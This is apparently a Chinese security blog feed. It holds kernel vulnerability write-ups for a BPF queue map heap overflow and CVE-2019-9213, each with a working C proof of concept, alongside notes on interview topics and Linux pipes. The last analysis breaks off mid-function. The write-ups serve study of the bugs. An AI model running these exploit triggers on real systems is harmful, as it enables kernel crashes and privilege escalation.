<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">queue_stack_map_push_elem</span><span class="params">(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">void</span> *value,</span></span></span><br><span class="line"><span class="function"><span class="params">				     u64 flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_queue_stack</span> *<span class="title">qs</span> = <span class="title">bpf_queue_stack</span>(<span class="title">map</span>);</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> irq_flags;</span><br><span class="line">	<span class="keyword">int</span> err = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">void</span> *dst;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* BPF_EXIST is used to force making room for a new element in case the</span></span><br><span class="line"><span class="comment">	 * map is full</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">bool</span> replace = (flags &amp; BPF_EXIST);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Check supported flags for queue and stack maps */</span></span><br><span class="line">	<span class="keyword">if</span> (flags &amp; BPF_NOEXIST || flags &gt; BPF_EXIST)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	raw_spin_lock_irqsave(&amp;qs-&gt;lock, irq_flags);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (queue_stack_map_is_full(qs)) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!replace) &#123;		&lt;&lt;-------------------- <span class="number">1</span></span><br><span class="line">			err = -E2BIG;</span><br><span class="line">			<span class="keyword">goto</span> out;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">/* advance tail pointer to overwrite oldest element */</span></span><br><span class="line">		<span class="keyword">if</span> (unlikely(++qs-&gt;tail &gt;= qs-&gt;size))</span><br><span class="line">			qs-&gt;tail = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	dst = &amp;qs-&gt;elements[qs-&gt;head * qs-&gt;<span class="built_in">map</span>.value_size];</span><br><span class="line">	<span class="built_in">memcpy</span>(dst, value, qs-&gt;<span class="built_in">map</span>.value_size);		&lt;&lt;--------------------- <span class="number">2</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(++qs-&gt;head &gt;= qs-&gt;size))</span><br><span class="line">		qs-&gt;head = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">	raw_spin_unlock_irqrestore(&amp;qs-&gt;lock, irq_flags);</span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_queue_stack</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> <span class="title">map</span>;</span></span><br><span class="line">	<span class="keyword">raw_spinlock_t</span> lock;</span><br><span class="line">	u32 head, tail;</span><br><span class="line">	u32 size; <span class="comment">/* max_entries + 1 */</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> elements[<span class="number">0</span>] __aligned(<span class="number">8</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>赫然看见2这里一处<code>memcpy</code>，根据<code>qs</code>结构体，便知道<code>dst</code>指向的本应该是<code>(u64) value_size * size</code>这么大的空间，然而我们却让它变成了0</p>
<p><code>value</code>是我们传入的指针，<code>value_size</code>是我们<code>map_create</code>的时候传入的，很明显这里就发生了堆溢出</p>
<p>要注意的是为了1处不通过，需要<code>flags &amp; BPF_EXIST</code>为1</p>
<h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>要利用的话，看师傅们的文章中都有一个很骚的词，即堆风水，其实就是构造合适的环境来方便利用</p>
<p>根据内核堆分配的习惯，相同大小的堆一般会分到一块去，所以如果我们再申请几个相同大小的map的话，这些map紧邻的几率将会很大</p>
<p>以下是<code>Poc</code>，会导致内核报错</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;	</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf_common.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __NR_BPF</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_BPF 321</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ptr_to_u64(ptr)	((__u64)(unsigned long)(ptr))</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">die</span><span class="params">(<span class="keyword">char</span> *ptr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	perror(ptr);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bpf_create_map</span><span class="params">(<span class="keyword">enum</span> bpf_map_type map_type,</span></span></span><br><span class="line"><span class="function"><span class="params">				   <span class="keyword">unsigned</span> <span class="keyword">int</span> key_size,</span></span></span><br><span class="line"><span class="function"><span class="params">				   <span class="keyword">unsigned</span> <span class="keyword">int</span> value_size,</span></span></span><br><span class="line"><span class="function"><span class="params">				   <span class="keyword">unsigned</span> <span class="keyword">int</span> max_entries)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">union</span> bpf_attr attr = &#123;</span><br><span class="line">		.map_type = map_type,</span><br><span class="line">		.key_size = key_size,</span><br><span class="line">		.value_size = value_size,</span><br><span class="line">		.max_entries = max_entries&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> syscall(__NR_BPF, BPF_MAP_CREATE, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bpf_update_elem</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">const</span> <span class="keyword">void</span> *key, <span class="keyword">const</span> <span class="keyword">void</span> *value,</span></span></span><br><span class="line"><span class="function"><span class="params">					<span class="keyword">uint64_t</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">union</span> bpf_attr attr = &#123;</span><br><span class="line">		.map_fd = fd,</span><br><span class="line">		.key = ptr_to_u64(key),</span><br><span class="line">		.value = ptr_to_u64(value),</span><br><span class="line">		.flags = flags,</span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> syscall(__NR_BPF, BPF_MAP_UPDATE_ELEM, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">void</span> *addr = mmap((<span class="keyword">void</span> *)<span class="number">0x2000000</span>, <span class="number">0x10000</span>, <span class="number">3</span>, <span class="number">0x32</span>, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="built_in">memset</span>(addr, <span class="number">0xff</span>, <span class="number">0x1000</span>);</span><br><span class="line">	<span class="keyword">if</span> (addr &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		die(<span class="string">"mmap"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">int</span> fd = bpf_create_map(BPF_MAP_TYPE_QUEUE, <span class="number">0</span>, <span class="number">0x100</span>, <span class="number">0xffffffff</span>);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> victim[<span class="number">0x20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x20</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		victim[i] = bpf_create_map(BPF_MAP_TYPE_QUEUE, <span class="number">0</span>, <span class="number">0x100</span>, <span class="number">0xffffffff</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	bpf_update_elem(fd, <span class="number">0</span>, (<span class="keyword">void</span>*)<span class="number">0x2000000</span>, BPF_EXIST);</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x20</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		bpf_update_elem(victim[i], <span class="number">0</span>, (<span class="keyword">void</span>*)<span class="number">0x2000000</span>, BPF_EXIST);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这个漏洞挺有意思的，也比较简单，适合作为CTF题出一出</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="http://p4nda.top/2019/01/02/kernel-bpf-overflow/" target="_blank" rel="noopener">http://p4nda.top/2019/01/02/kernel-bpf-overflow/</a></p>
<p><a href="https://www.anquanke.com/post/id/166819#h3-6" target="_blank" rel="noopener">https://www.anquanke.com/post/id/166819#h3-6</a></p>
<p><a href="http://www.man7.org/linux/man-pages/man2/bpf.2.html" target="_blank" rel="noopener">http://www.man7.org/linux/man-pages/man2/bpf.2.html</a></p>
<p><a href="https://elixir.bootlin.com/linux/v4.20-rc1" target="_blank" rel="noopener">https://elixir.bootlin.com/linux/v4.20-rc1</a></p>
]]></content>
      <categories>
        <category>CVE</category>
      </categories>
      <tags>
        <tag>kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>面试不会的点</title>
    <url>/2020/04/02/%E9%9D%A2%E8%AF%95%E4%B8%8D%E4%BC%9A%E7%9A%84%E7%82%B9/</url>
    <content><![CDATA[<p>慎</p>
<a id="more"></a>

<h1 id="什么是volatile关键字"><a href="#什么是volatile关键字" class="headerlink" title="什么是volatile关键字"></a>什么是volatile关键字</h1><p><code>volatile</code>意味易变的，用它声明的变量，编译器在用到这个变量时必须每次都小心地重新读取这个变量的值，而不是使用保存在寄存器里的备份</p>
<p>参考：<a href="https://baike.baidu.com/item/volatile" target="_blank" rel="noopener">https://baike.baidu.com/item/volatile</a></p>
<h1 id="什么是MMU"><a href="#什么是MMU" class="headerlink" title="什么是MMU"></a>什么是MMU</h1><p><code>MMU</code>是内存管理单元，它是一种用于处理CPU的内存访问请求的硬件，它的功能包括虚拟地址到物理地址的转换，内存保护、CPU高速缓存的控制等</p>
<p>参考：<a href="https://baike.baidu.com/item/MMU/4542218?fr=aladdin" target="_blank" rel="noopener">https://baike.baidu.com/item/MMU/4542218?fr=aladdin</a></p>
<h1 id="PC是什么"><a href="#PC是什么" class="headerlink" title="PC是什么"></a>PC是什么</h1><p>PC其实就算rip，说是啥虚拟地址还是物理地址，其实都是虚拟地址，面试官一口一个PC直接把我干懵了</p>
<h1 id="struct"><a href="#struct" class="headerlink" title="struct"></a>struct</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">test</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> a;</span><br><span class="line">    <span class="keyword">long</span> b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在64位下，因为8个字节是基本单位，所以你如果<code>sizeof</code>这个结构体的话会得到16这个结果</p>
<h1 id="kmalloc分配的块是2的n次幂整数"><a href="#kmalloc分配的块是2的n次幂整数" class="headerlink" title="kmalloc分配的块是2的n次幂整数"></a>kmalloc分配的块是2的n次幂整数</h1>]]></content>
  </entry>
  <entry>
    <title>Linux的pipe与fifo</title>
    <url>/2020/04/01/Linux%E7%9A%84pipe%E4%B8%8Efifo/</url>
    <content><![CDATA[<p>关于Linux C中的管道</p>
<a id="more"></a>

<h1 id="pipe"><a href="#pipe" class="headerlink" title="pipe"></a>pipe</h1><p><code>pipe</code>是匿名管道，其定义为<code>int pipe(int filedes[2]);</code></p>
<p>其接收一个int类型的数组，若函数执行成功，数组的第零项是管道的读端，第一项是管道的写端</p>
<p>如果函数执行成功则返回0，否则返回-1</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> fd[<span class="number">2</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret = pipe(fd);</span><br><span class="line">    <span class="keyword">if</span>(ret &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"fail to open pipe!"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>随后使用<code>read</code>和<code>write</code>函数即可对管道进行读写</p>
<p>局限性：</p>
<ul>
<li>只能用于有亲缘关系的进程之中，例如<code>fork</code>出来的子进程</li>
<li>没有名字</li>
<li>管道的缓冲区有限</li>
</ul>
<h1 id="fifo"><a href="#fifo" class="headerlink" title="fifo"></a>fifo</h1><p><code>fifo</code>是命名管道</p>
<p>创建它的函数为<code>mkfifo</code>，其定义为<code>int mkfifo(const char * pathname, mode_t mode)</code></p>
<p>其接收两个参数，第一个为一个普通的路径名，即<code>fifo</code>的名字，第二个参数<code>mode</code>是fifo文件的访问权限</p>
<p>如果函数执行成功则返回0，否则返回-1</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret = mkfifo(<span class="string">"/tmp/testfifo"</span>, O_RWDR);</span><br><span class="line">    <span class="keyword">if</span>(ret &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"fail to make fifo!"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一旦<code>fifo</code>创建成功，任何进程都可以用平常对文件进行读写的方式使用它</p>
<p>然而，如果要发挥其管道的作用，在读端和写端两个进程中<code>fifo</code>文件必须都是打开的</p>
]]></content>
      <categories>
        <category>学习日记</category>
      </categories>
      <tags>
        <tag>Linux C</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2019-9213 Poc分析</title>
    <url>/2020/03/31/CVE-2019-9213-Poc%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>看了许多关于这个漏洞的文章，这里进行一下自我总结</p>
<p>参考：<a href="https://cert.360.cn/report/detail?id=58e8387ec4c79693354d4797871536ea" target="_blank" rel="noopener">https://cert.360.cn/report/detail?id=58e8387ec4c79693354d4797871536ea</a></p>
<a id="more"></a>

<h1 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *<span class="built_in">map</span> = mmap((<span class="keyword">void</span>*)<span class="number">0x10000</span>, <span class="number">0x1000</span>, PROT_READ|PROT_WRITE,</span><br><span class="line">                   MAP_PRIVATE|MAP_ANONYMOUS|MAP_GROWSDOWN|MAP_FIXED, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">map</span> == MAP_FAILED) err(<span class="number">1</span>, <span class="string">"mmap"</span>);</span><br><span class="line">  <span class="keyword">int</span> fd = open(<span class="string">"/proc/self/mem"</span>, O_RDWR);</span><br><span class="line">  <span class="keyword">if</span> (fd == <span class="number">-1</span>) err(<span class="number">1</span>, <span class="string">"open"</span>);</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> addr = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)<span class="built_in">map</span>;</span><br><span class="line">  <span class="keyword">while</span> (addr != <span class="number">0</span>) &#123;</span><br><span class="line">    addr -= <span class="number">0x1000</span>;</span><br><span class="line">    <span class="keyword">if</span> (lseek(fd, addr, SEEK_SET) == <span class="number">-1</span>) err(<span class="number">1</span>, <span class="string">"lseek"</span>);</span><br><span class="line">    <span class="keyword">char</span> cmd[<span class="number">1000</span>];</span><br><span class="line">    <span class="built_in">sprintf</span>(cmd, <span class="string">"LD_DEBUG=help su 1&gt;&amp;%d"</span>, fd);</span><br><span class="line">    system(cmd);</span><br><span class="line">  &#125;</span><br><span class="line">  system(<span class="string">"head -n1 /proc/$PPID/maps"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"data at NULL: 0x%lx\n"</span>, *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先<code>mmap</code>一页内存，以0x10000为地址，然后打开<code>/proc/self/mem</code>文件，该文件所映射的是当前进程的内存，相对文件的偏移对应的是进程的地址</p>
<p>之后进入<code>while</code>循环，一页一页的利用漏洞向前请求内存，最后从0到0x11000的内存都可以被映射</p>
<h1 id="跟进分析"><a href="#跟进分析" class="headerlink" title="跟进分析"></a>跟进分析</h1><p>文件写相关函数在此定义：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">proc_mem_operations</span> = &#123;</span></span><br><span class="line">	.llseek		= mem_lseek,</span><br><span class="line">	.read		= mem_read,</span><br><span class="line">	.write		= mem_write,</span><br><span class="line">	.open		= mem_open,</span><br><span class="line">	.release	= mem_release,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>直接看<code>mem_write</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> ssize_t <span class="title">mem_write</span><span class="params">(struct file *file, <span class="keyword">const</span> <span class="keyword">char</span> __user *buf,</span></span></span><br><span class="line"><span class="function"><span class="params">			 <span class="keyword">size_t</span> count, <span class="keyword">loff_t</span> *ppos)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> mem_rw(file, (<span class="keyword">char</span> __user*)buf, count, ppos, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> ssize_t <span class="title">mem_rw</span><span class="params">(struct file *file, <span class="keyword">char</span> __user *buf,</span></span></span><br><span class="line"><span class="function"><span class="params">			<span class="keyword">size_t</span> count, <span class="keyword">loff_t</span> *ppos, <span class="keyword">int</span> write)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> = <span class="title">file</span>-&gt;<span class="title">private_data</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> addr = *ppos;</span><br><span class="line">	<span class="keyword">ssize_t</span> copied;</span><br><span class="line">	<span class="keyword">char</span> *page;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> flags;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!mm)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	page = (<span class="keyword">char</span> *)__get_free_page(GFP_TEMPORARY);</span><br><span class="line">	<span class="keyword">if</span> (!page)</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">	copied = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (!atomic_inc_not_zero(&amp;mm-&gt;mm_users))</span><br><span class="line">		<span class="keyword">goto</span> <span class="built_in">free</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Maybe we should limit FOLL_FORCE to actual ptrace users? */</span></span><br><span class="line">	flags = FOLL_FORCE;</span><br><span class="line">	<span class="keyword">if</span> (write)</span><br><span class="line">		flags |= FOLL_WRITE;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (count &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">int</span> this_len = <span class="keyword">min_t</span>(<span class="keyword">int</span>, count, PAGE_SIZE);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (write &amp;&amp; copy_from_user(page, buf, this_len)) &#123; <span class="comment">//这里从buf复制到page中</span></span><br><span class="line">			copied = -EFAULT;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		this_len = access_remote_vm(mm, addr, page, this_len, flags);<span class="comment">//addr就是我们Poc中的addr,this_len就是我们输入的大小</span></span><br><span class="line">		<span class="keyword">if</span> (!this_len) &#123;</span><br><span class="line">			<span class="keyword">if</span> (!copied)</span><br><span class="line">				copied = -EIO;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!write &amp;&amp; copy_to_user(buf, page, this_len)) &#123;</span><br><span class="line">			copied = -EFAULT;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		buf += this_len;</span><br><span class="line">		addr += this_len;</span><br><span class="line">		copied += this_len;</span><br><span class="line">		count -= this_len;</span><br><span class="line">	&#125;</span><br><span class="line">	*ppos = addr;</span><br><span class="line"></span><br><span class="line">	mmput(mm);</span><br><span class="line"><span class="built_in">free</span>:</span><br><span class="line">	free_page((<span class="keyword">unsigned</span> <span class="keyword">long</span>) page);</span><br><span class="line">	<span class="keyword">return</span> copied;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对文件写所涉及的操作就是如上注释那两个，先从buf复制到page中，然后再把page中的数据写入另一个进程中</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * access_remote_vm - access another process' address space</span></span><br><span class="line"><span class="comment"> * @mm:		the mm_struct of the target address space</span></span><br><span class="line"><span class="comment"> * @addr:	start address to access</span></span><br><span class="line"><span class="comment"> * @buf:	source or destination buffer</span></span><br><span class="line"><span class="comment"> * @len:	number of bytes to transfer</span></span><br><span class="line"><span class="comment"> * @gup_flags:	flags modifying lookup behaviour</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The caller must hold a reference on @mm.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">access_remote_vm</span><span class="params">(struct mm_struct *mm, <span class="keyword">unsigned</span> <span class="keyword">long</span> addr,</span></span></span><br><span class="line"><span class="function"><span class="params">		<span class="keyword">void</span> *buf, <span class="keyword">int</span> len, <span class="keyword">unsigned</span> <span class="keyword">int</span> gup_flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> __access_remote_vm(<span class="literal">NULL</span>, mm, addr, buf, len, gup_flags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Access another process' address space as given in mm.  If non-NULL, use the</span></span><br><span class="line"><span class="comment"> * given task for page fault accounting.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">int</span> __access_remote_vm(struct task_struct *tsk, struct mm_struct *mm,</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">long</span> addr, <span class="keyword">void</span> *buf, <span class="keyword">int</span> len, <span class="keyword">unsigned</span> <span class="keyword">int</span> gup_flags)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">vma</span>;</span></span><br><span class="line">	<span class="keyword">void</span> *old_buf = buf;</span><br><span class="line">	<span class="keyword">int</span> write = gup_flags &amp; FOLL_WRITE;</span><br><span class="line"></span><br><span class="line">	down_read(&amp;mm-&gt;mmap_sem);</span><br><span class="line">	<span class="comment">/* ignore errors, just check how much was successfully transferred */</span></span><br><span class="line">	<span class="keyword">while</span> (len) &#123;</span><br><span class="line">		<span class="keyword">int</span> bytes, ret, offset;</span><br><span class="line">		<span class="keyword">void</span> *maddr;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span> = <span class="title">NULL</span>;</span></span><br><span class="line"></span><br><span class="line">		ret = get_user_pages_remote(tsk, mm, addr, <span class="number">1</span>,</span><br><span class="line">				gup_flags, &amp;page, &amp;vma, <span class="literal">NULL</span>);<span class="comment">//将另一个进程从addr开始之后的1个页固定到内存中，并将他们的指针写入&amp;page中</span></span><br><span class="line">		<span class="keyword">if</span> (ret &lt;= <span class="number">0</span>) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CONFIG_HAVE_IOREMAP_PROT</span></span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">			<span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * Check if this is a VM_IO | VM_PFNMAP VMA, which</span></span><br><span class="line"><span class="comment">			 * we can access using slightly different code.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			vma = find_vma(mm, addr);</span><br><span class="line">			<span class="keyword">if</span> (!vma || vma-&gt;vm_start &gt; addr)</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">if</span> (vma-&gt;vm_ops &amp;&amp; vma-&gt;vm_ops-&gt;access)</span><br><span class="line">				ret = vma-&gt;vm_ops-&gt;access(vma, addr, buf,</span><br><span class="line">							  len, write);</span><br><span class="line">			<span class="keyword">if</span> (ret &lt;= <span class="number">0</span>)</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			bytes = ret;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			bytes = len;</span><br><span class="line">			offset = addr &amp; (PAGE_SIZE<span class="number">-1</span>);</span><br><span class="line">			<span class="keyword">if</span> (bytes &gt; PAGE_SIZE-offset)</span><br><span class="line">				bytes = PAGE_SIZE-offset;</span><br><span class="line"></span><br><span class="line">			maddr = kmap(page);<span class="comment">//用kmap把page映射出来</span></span><br><span class="line">			<span class="keyword">if</span> (write) &#123;</span><br><span class="line">				copy_to_user_page(vma, page, addr,</span><br><span class="line">						  maddr + offset, buf, bytes);</span><br><span class="line">				set_page_dirty_lock(page);<span class="comment">//其实就相当于，memcpy(maddr+offset, buf, bytes)</span></span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				